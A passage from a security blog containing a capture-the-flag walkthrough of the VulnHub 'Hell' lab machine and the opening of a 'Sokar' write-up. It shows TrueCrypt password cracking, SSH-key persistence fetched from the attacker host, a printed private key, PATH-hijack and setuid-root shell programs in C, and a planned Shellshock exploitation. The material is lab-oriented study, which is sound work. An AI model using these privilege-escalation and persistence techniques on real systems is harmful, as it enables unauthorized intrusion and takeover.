<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ pwd
</span><span class='line'>/home/george
</span><span class='line'>$ ls -l
</span><span class='line'>total 4096
</span><span class='line'>-rw------- 1 george george 4194304 Jul 12 08:30 container.tc
</span><span class='line'>$ find / -user george -perm -g=s -o -perm -u=s -type f 2>/dev/null
</span><span class='line'>/usr/lib/openssh/ssh-keysign
</span><span class='line'>/usr/lib/pt_chown
</span><span class='line'>/usr/sbin/exim4
</span><span class='line'>/usr/bin/chsh
</span><span class='line'>/usr/bin/newgrp
</span><span class='line'>/usr/bin/sudo
</span><span class='line'>/usr/bin/procmail
</span><span class='line'>/usr/bin/chfn
</span><span class='line'>/usr/bin/gpasswd
</span><span class='line'>/usr/bin/passwd
</span><span class='line'>/usr/bin/sudoedit
</span><span class='line'>/usr/bin/game.py
</span><span class='line'>/usr/bin/lesson101
</span><span class='line'>/sbin/mount.nfs
</span><span class='line'>/var/mail/george
</span><span class='line'>/bin/umount
</span><span class='line'>/bin/ping
</span><span class='line'>/bin/su
</span><span class='line'>/bin/mount
</span><span class='line'>/bin/ping6
</span><span class='line'>$ ls -l /var/mail/george
</span><span class='line'>total 4
</span><span class='line'>-rw-r--r-- 1 george george 175 Jun 20  2014 signup.eml
</span><span class='line'>$ cat /var/mail/george/signup.eml
</span><span class='line'>From: admin@rockyou.com
</span><span class='line'>To: super_admin@hell.com
</span><span class='line'>Subject: Account Activation
</span><span class='line'>Date: 13th November 2009
</span><span class='line'>
</span><span class='line'>Thanks for signing up for your account. I hope you enjoy our services. 
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>


<p>Then I downloaded the container file <code>container.tc</code> to my Kali and use <code>truecrack</code> with rockyou.txt to crack the password. Due to my laptop do not have a strong GPU so I could not take advantage of hashcat which is really disappointed. T.T</p>

<p>However, the hard way is still working, just a little slow&hellip; after waiting for a quite while, I finally cracked the password: <em><font color="red">letsyouupdateyourfunnotesandmore</font></em></p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Hell1/5.png"></p>

<p>In order to get a better shell with full privilege of george, I use ssh-keygen to generate a new ssh key pair (passphrase is <em><font color="red">test1337</font></em>) and upload the public key to target server as <code>.ssh/authorized_keys</code>. Then use the private key to login via SSH.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# ssh-keygen
</span><span class='line'>Generating public/private rsa key pair.
</span><span class='line'>Enter file in which to save the key (/root/.ssh/id_rsa): g_id_rsa
</span><span class='line'>Enter passphrase (empty for no passphrase): 
</span><span class='line'>Enter same passphrase again: 
</span><span class='line'>Your identification has been saved in g_id_rsa.
</span><span class='line'>Your public key has been saved in g_id_rsa.pub.
</span><span class='line'>The key fingerprint is:
</span><span class='line'>81:82:98:44:59:c7:f2:68:fe:b8:76:04:f1:b1:a2:97 root@kali
</span><span class='line'>The key's randomart image is:
</span><span class='line'>+--[ RSA 2048]----+
</span><span class='line'>|.oo...           |
</span><span class='line'>|.+ +.o .         |
</span><span class='line'>|o . B + .        |
</span><span class='line'>|   = =   .       |
</span><span class='line'>|  + +   S        |
</span><span class='line'>| . E .           |
</span><span class='line'>|  . +            |
</span><span class='line'>|   o o           |
</span><span class='line'>|  ..o            |
</span><span class='line'>+-----------------+</span></code></pre></td></tr></table></div></figure>


<p>Now back to target server to create <code>.ssh</code> folder and pull the SSH private key from my Kali.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ mkdir .ssh
</span><span class='line'>$ cd .ssh
</span><span class='line'>$ wget http://10.10.10.131/g_id_rsa.pub -O authorized_keys
</span><span class='line'>--2015-07-16 10:19:59--  http://10.10.10.131/g_id_rsa.pub
</span><span class='line'>Connecting to 10.10.10.131:80... connected.
</span><span class='line'>HTTP request sent, awaiting response... 200 OK
</span><span class='line'>Length: 391
</span><span class='line'>Saving to: `authorized_keys'
</span><span class='line'>
</span><span class='line'>100%[==================================================================================================>] 391         --.-K/s   in 0s      
</span><span class='line'>
</span><span class='line'>2015-07-16 10:19:59 (59.7 MB/s) - `authorized_keys' saved [391/391]
</span><span class='line'>
</span><span class='line'>$ ls
</span><span class='line'>authorized_keys
</span><span class='line'>$ ls -l
</span><span class='line'>total 4
</span><span class='line'>-rw-r--r-- 1 george milk_4_life 391 Jul 16 00:19 authorized_keys
</span><span class='line'>$ /bin/chmod 600 authorized_keys
</span><span class='line'>$ ls -l
</span><span class='line'>total 4
</span><span class='line'>-rw------- 1 george milk_4_life 391 Jul 16 00:19 authorized_keys
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>


<p>SSH login with password <em><font color="red">test1337</font></em></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/hell# ssh george@10.10.10.146 -i g_id_rsa
</span><span class='line'>Enter passphrase for key 'g_id_rsa': 
</span><span class='line'>Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>No mail.
</span><span class='line'>Last login: Thu Jul 16 10:14:43 2015 from 10.10.10.131
</span><span class='line'>george@hell:~$ id
</span><span class='line'>uid=1000(george) gid=1000(george) groups=1000(george),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
</span><span class='line'>george@hell:~$ pwd
</span><span class='line'>/home/george
</span><span class='line'>george@hell:~$ ls -l
</span><span class='line'>total 4096
</span><span class='line'>-rw------- 1 george george 4194304 Jul 12 08:30 container.tc
</span><span class='line'>george@hell:~$</span></code></pre></td></tr></table></div></figure>


<p>After get into the truecrypt container, I found a RSA private key file which should be someone&rsquo;s SSH key.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>george@hell:~$ truecrypt container.tc 
</span><span class='line'>Enter mount directory [default]: 
</span><span class='line'>Enter password for /home/george/container.tc: 
</span><span class='line'>Enter keyfile [none]: 
</span><span class='line'>Protect hidden volume (if any)? (y=Yes/n=No) [No]: 
</span><span class='line'>george@hell:~$ df -h
</span><span class='line'>Filesystem                                              Size  Used Avail Use% Mounted on
</span><span class='line'>rootfs                                                  7.6G  1.4G  5.8G  20% /
</span><span class='line'>udev                                                     10M     0   10M   0% /dev
</span><span class='line'>tmpfs                                                    51M  224K   51M   1% /run
</span><span class='line'>/dev/disk/by-uuid/c53be26e-768a-4c87-90d3-792c47148ca4  7.6G  1.4G  5.8G  20% /
</span><span class='line'>tmpfs                                                   5.0M     0  5.0M   0% /run/lock
</span><span class='line'>tmpfs                                                   178M     0  178M   0% /run/shm
</span><span class='line'>/dev/mapper/truecrypt1                                  3.8M  2.0K  3.8M   1% /media/truecrypt1
</span><span class='line'>george@hell:~$ cd /media/truecrypt1
</span><span class='line'>george@hell:/media/truecrypt1$ ls -l
</span><span class='line'>total 2
</span><span class='line'>-rwx------ 1 george george 1679 Jul  5  2014 id_rsa
</span><span class='line'>george@hell:/media/truecrypt1$ cat id_rsa
</span><span class='line'>-----BEGIN RSA PRIVATE KEY-----
</span><span class='line'>MIIEpQIBAAKCAQEAxlCbg0ln2dqRO3iIXPUvK3irg/9l5uvBAQdXTVmcm/JWN9OA
</span><span class='line'>25XtZX8LOfiJtc+8OYXgD6lXNVPh9BjElq6qpR7fk1TaXXUlyiSlwCxz68n/cpYs
</span><span class='line'>f6UUa9QXm0LSHD8m7g/e5qqIm8bb15TIC6+8TmSB11FE9NLPN+8hVyP1S9EBntom
</span><span class='line'>t5watKDFUNF+mcl14Tj+INcWB2qpEPgZ1mIwq1Zw3w/vy27y0i1r52+fot1vgf2K
</span><span class='line'>Ymo6GipsdxW1k/UuCjJEE6e0GZFA8vhpH5F4MG8k33vIPqkxgEgF0GX8RPAQF/Xf
</span><span class='line'>gxERhkGP+hVOd8b11OXzxWGGQyqwOYF8+7qVjwIDAQABAoIBAQCyldpFUvBDXbEV
</span><span class='line'>dgiOdXkh04vY1UBlv/3ROFQk4sLGKGf94+gRViUvFkX80VTptgWRY36Pe/Z9nmlG
</span><span class='line'>0JsP+oDPK0s4uNvf92Otcm0U7rMBLals/dFarUUDiT4s4fKl3zTmgsI+xGk6psxI
</span><span class='line'>icHPzFRt39KRHK1VLxXOD/jdKRN3Tk0odH1kNahOuFC2F5T+aqdlC/RAGwxnTDBe
</span><span class='line'>AFPFlns83GaPYlIt05DZsdGftG7mITkNfUVS5AIyeedshU4OyPXu5bGgUgbtars4
</span><span class='line'>GdttJ33Tm5hO+n3E93sW7XMKG4v4po+1Fu0OwNQNpaRo6gVqK7AZHNPxBRW7K4Zc
</span><span class='line'>w2d0EXehAoGBAOQgtqb5QVyhiCdT53xjZTMHH74ApWRpsoLtu/LaZnQV0v/dzEIv
</span><span class='line'>jei58v/PusXsSwOQeb4p2obOReQFbYG48vCiywwMbeOeqH2d69HYatHmxPXngKS3
</span><span class='line'>6trus/pHuDJosFw1qhgVo9ao0o8IH6cveHidmwvzKfiphgM3yCXF9jyxAoGBAN6L
</span><span class='line'>awHXmHQCsCq//UbHbfuaBScJOpaagKP1BIskl5RDaQ/U/DzSpxju0ldedX7HYVFW
</span><span class='line'>Rk6NQQ6QiXIC/5D7Xj+tcR2EFI+Tt9xp6dE/UlxpUL1h9QCBfmdw0CT9WSwJEGF7
</span><span class='line'>R+D18trKcb/NkYdJV8ZpaT00rLzyBx5MY/FZbYY/AoGBALrCwWXfR5BjOckgmrGt
</span><span class='line'>2cq1uVnew4h6M8eWgzklbZz5xPzuAuvobKAro3GkCb9BXIQ1gkWZlCqqsnMjsmvy
</span><span class='line'>EwnH7L0Xa9teJ4h3gfkQ2Rqwd2ztstanLyE/LJ7omjbCmCdVU8RV6wSwv3iTaP6B
</span><span class='line'>EXqFZMqarzDA8FKwFy49bAJxAoGBALkXBYG7uW1LSw/TLCjw9zVaTUzBLTxS9gjn
</span><span class='line'>YMcFQRir1Da5sqw3m4huIP1Pb7NoyjTm54SvkNs3NUlg2wPPPP0DGOAumRctCa9F
</span><span class='line'>W5WP78UyRlesoCOyj9oihsss9zxbsYcSDJ86j6iO1Xpr08zMIDfCNigUplJjja4S
</span><span class='line'>ZNE3ypLrAoGAbp+vBcqQRfnXWfmcdnHYFbwgWbokPSe2fScajWiyvcg4/6gL1e50
</span><span class='line'>rpO3RTOREUD02pBbyG4LDFv7x/5niqASL0tS8/0xWDBDj5QmD9UTmMd5hsMbj8Lw
</span><span class='line'>qJA0ErZEjIE9+jXYLbsTsB8tRTsqMqBfCCovHXAjy0h5B6j500PfImM=
</span><span class='line'>-----END RSA PRIVATE KEY-----
</span><span class='line'>george@hell:/media/truecrypt1$</span></code></pre></td></tr></table></div></figure>


<p>Then I download the SSH private key file to my Kali and try use it to login accounts found before.(only <strong>bazza</strong> and <strong>oj</strong> left)</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/hell# ssh bazza@10.10.10.146 -i tr_id_rsa 
</span><span class='line'>Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>You have mail.
</span><span class='line'>Last login: Thu Jul 16 10:32:07 2015 from 10.10.10.131
</span><span class='line'>$ id
</span><span class='line'>uid=1004(bazza) gid=1004(bazza) groups=1004(bazza)
</span><span class='line'>$ ls -alh   
</span><span class='line'>total 40K
</span><span class='line'>drwx------ 3 bazza bazza      4.0K Jul 17 08:35 .
</span><span class='line'>drwxr-xr-x 7 root  root       4.0K Jul  5  2014 ..
</span><span class='line'>-rw-r--r-- 1 root  root        109 Jul  6  2014 barrebas.txt
</span><span class='line'>-rw------- 1 bazza bazza       492 Jul 13 01:33 .bash_history
</span><span class='line'>-r-xr-sr-x 1 oj    developers 6.1K Jul  6  2014 part1
</span><span class='line'>-r-sr-xr-x 1 oj    oj         5.2K Jul  6  2014 part2
</span><span class='line'>drwx------ 2 bazza bazza      4.0K Jul  5  2014 .ssh
</span><span class='line'>-rw------- 1 bazza bazza       781 Jul 13 01:42 .viminfo
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>


<h2>Moving to <strong>oj</strong></h2>

<p>Here we found executable program: <code>part1</code> and <code>part2</code> which has sticky bit set and owned by <strong>oj</strong>, so here should give a close check.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./part1
</span><span class='line'>Checking integrity of part2... Done!!
</span><span class='line'>
</span><span class='line'>Checking integrity of calling target... Done!!
</span><span class='line'>
</span><span class='line'>Binary and target confirmed.
</span><span class='line'>
</span><span class='line'>Can't touch this *nah na na na na naaaaaaaa nah*
</span><span class='line'>uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>


<p>Here we can see that the running program has executed system command <code>id</code>. So very similar method used previously, I upload setuid.c and change it a little bit as follow and then gcc compile it to <code>/tmp/id</code>, then set environmental variable PATH to include <code>/tmp</code> at the beginning.</p>

<figure class='code'><figcaption><span>baz2.c  (baz2.c)</span> <a href='http://f4l13n5n0w.github.io/downloads/code/baz2.c'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'> <span class="n">setuid</span><span class="p">(</span> <span class="mi">1005</span> <span class="p">);</span>
</span><span class='line'> <span class="n">system</span><span class="p">(</span><span class="s">&quot;/usr/bin/id&quot;</span><span class="p">);</span>
</span><span class='line'> <span class="n">system</span><span class="p">(</span> <span class="s">&quot;/bin/sh -i&quot;</span> <span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ gcc baz2.c -o /tmp/id
</span><span class='line'>$ ls -l /tmp
</span><span class='line'>total 8
</span><span class='line'>-rwxr-xr-x 1 bazza bazza 5028 Jul 17 08:26 id
</span><span class='line'>$ ./part1
</span><span class='line'>Checking integrity of part2... Done!!
</span><span class='line'>
</span><span class='line'>Checking integrity of calling target... Done!!
</span><span class='line'>
</span><span class='line'>Binary and target confirmed.
</span><span class='line'>
</span><span class='line'>Can't touch this *nah na na na na naaaaaaaa nah*
</span><span class='line'>uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
</span><span class='line'>oj
</span><span class='line'>$ whoami
</span><span class='line'>oj
</span><span class='line'>$ /usr/bin/id
</span><span class='line'>uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)</span></code></pre></td></tr></table></div></figure>


<p>Now, I am oj. :D</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ whoami 
</span><span class='line'>oj
</span><span class='line'>$ ls -al
</span><span class='line'>total 592
</span><span class='line'>drwx------ 2 oj   oj     4096 Jul 17 23:48 .
</span><span class='line'>drwxr-xr-x 7 root root   4096 Jul  5  2014 ..
</span><span class='line'>-r-sr-xr-x 1 root root 592549 Jul  5  2014 echo
</span><span class='line'>-rw-r--r-- 1 root root    154 Jul  5  2014 How to be an infosec rockstar 101.txt
</span><span class='line'>$ ./echo AAAA-%p-%p 
</span><span class='line'>AAAA-0x80488c0-0xbffffce8$ 
</span><span class='line'>$</span></code></pre></td></tr></table></div></figure>


<p>Here I found one executable file owned by <code>root</code> under oj&rsquo;s home folder and that file has sticky bit been set which could be a way to ROOT. Also <code>echo</code> program has <a href="https://www.owasp.org/index.php/Format_string_attack">Format String vulnerability</a></p>

<h2>Getting ROOT</h2>

<p>After suffering a lot of hours painful to deal with Format String exploit about <code>echo</code>. I still could not make it work for me :`(</p>

<p>However, there is another way to privilege escape to ROOT, which has been demostrated by <a href="http://vinicius777.github.io/blog/2014/07/14/truecrypt-privilege-escalation/">vincius777</a></p>

<figure class='code'><figcaption><span>getroot2.c  (getroot2.c)</span> <a href='http://f4l13n5n0w.github.io/downloads/code/getroot2.c'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'> <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'> <span class="n">system</span><span class="p">(</span> <span class="s">&quot;/bin/sh -i&quot;</span> <span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>george@hell:~$ df -h
</span><span class='line'>Filesystem                                              Size  Used Avail Use% Mounted on
</span><span class='line'>rootfs                                                  7.6G  1.4G  5.8G  20% /
</span><span class='line'>udev                                                     10M     0   10M   0% /dev
</span><span class='line'>tmpfs                                                    51M  224K   51M   1% /run
</span><span class='line'>/dev/disk/by-uuid/c53be26e-768a-4c87-90d3-792c47148ca4  7.6G  1.4G  5.8G  20% /
</span><span class='line'>tmpfs                                                   5.0M     0  5.0M   0% /run/lock
</span><span class='line'>tmpfs                                                   178M     0  178M   0% /run/shm
</span><span class='line'>/dev/mapper/truecrypt1                                  1.8M   26K  1.7M   2% /media/truecrypt1
</span><span class='line'>george@hell:~$ cd /media/truecrypt1
</span><span class='line'>george@hell:/media/truecrypt1$ ls -l
</span><span class='line'>total 18
</span><span class='line'>-rwsrwxrwx 1 root root   152 Jul 17 17:13 getroot
</span><span class='line'>-rwsrwxrwx 1 root root  4970 Jul 17 17:14 getroot2
</span><span class='line'>drwx------ 2 root root 12288 Jul 17 17:09 lost+found
</span><span class='line'>george@hell:/media/truecrypt1$ ./getroot2
</span><span class='line'># id
</span><span class='line'>uid=0(root) gid=1000(george) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(george)
</span><span class='line'># pwd
</span><span class='line'>/media/truecrypt1
</span><span class='line'># whoami
</span><span class='line'>root
</span><span class='line'># cat /root/flag.txt
</span><span class='line'>Congratulations of beating Hell. 
</span><span class='line'>
</span><span class='line'>I hope you enjoyed it and there weren't to many trolls in here for you. 
</span><span class='line'>
</span><span class='line'>Hit me up on irc.freenode.net in #vulnhub with your thoughts (Peleus) or follow me on twitter @0x42424242
</span><span class='line'>
</span><span class='line'>Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54fffc47476980343ab99951018fa6f71f030b9986c8ecbfc3a3d5de
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>#</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[Vulnhub]Sokar: 1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/07/07/vulnhub-sokar-1/"/>
    <updated>2015-07-07T16:41:59+10:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/07/07/vulnhub-sokar-1</id>
    <content type="html"><![CDATA[<p><strong>Sokar</strong> is created by <a href="http://rastamouse.me/">Rasta Mouse</a> and it also is the first competition in 2015 run by VulnHub team.</p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/sokar-1,113/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali Linux (<em>10.10.10.131/24</em>)</p>

<p>Target: Sokar (<em>10.10.10.145/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li>Shellshock (Bash bug) give attacker a way to break in and also get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">Net Discover</font>]</li>
<li>Port scanned the target to discover the running services and open ports [<font color="FF8000">nmap</font>]</li>
<li>Web information gathering and interacting with the web server [<font color="FF8000">firefox</font>]</li>
<li>Shellshock vulnerability detect and check [<font color="FF8000">wget</font>]</li>
<li>Analysis and write script to exploit shellshock bug</li>
<li>Poked around in the file system and found sensitive information</li>
<li>Hijack executable program to get reverse shell</li>
<li>Exploit shellshock bug to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://nixgeneration.com/~jaime/netdiscover/">netdiscover</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="http://www.gnu.org/software/wget/">wget</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using netdiscover as routine to detect the target&rsquo;s IP address (10.10.10.145 in this case).</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/Sokar1/1.png"></p>

<p>10.10.10.145 is our Target!</p>

<p>Then run NMAP scan to detect opening ports/running services on the target. From the result, found apache 2.2.15 is running on port 591 and the target OS is CentOS Linux.</p>

<p><code>nmap -sV -v -O -A -T5 -p- 10.10.10.145</code></p>

